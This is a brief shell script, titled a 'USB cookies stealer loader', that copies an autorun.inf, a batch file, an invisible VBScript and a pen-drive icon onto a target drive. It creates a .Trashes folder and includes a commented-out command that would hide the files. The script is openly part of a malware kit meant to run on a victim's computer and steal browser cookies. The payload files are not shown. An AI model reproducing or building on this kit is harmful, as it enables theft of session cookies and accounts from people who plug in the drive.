##################################################################################
# USB COOKIES STEALER loader script                                              #
##################################################################################

if [ $# -ne 1 ]
then
	echo Usage: $0 [destination folder]
	exit
fi

dest="$1"
targets="autorun.inf d.bat invisible.vbs PEN-ICON.ico"
#hide=setfattr -h -v 0x00000000 -n system.ntfs_attrib_be

for i in $targets
do
	cp $i "$dest"
	#$hide "$dest$i"
done

mkdir "$dest.Trashes"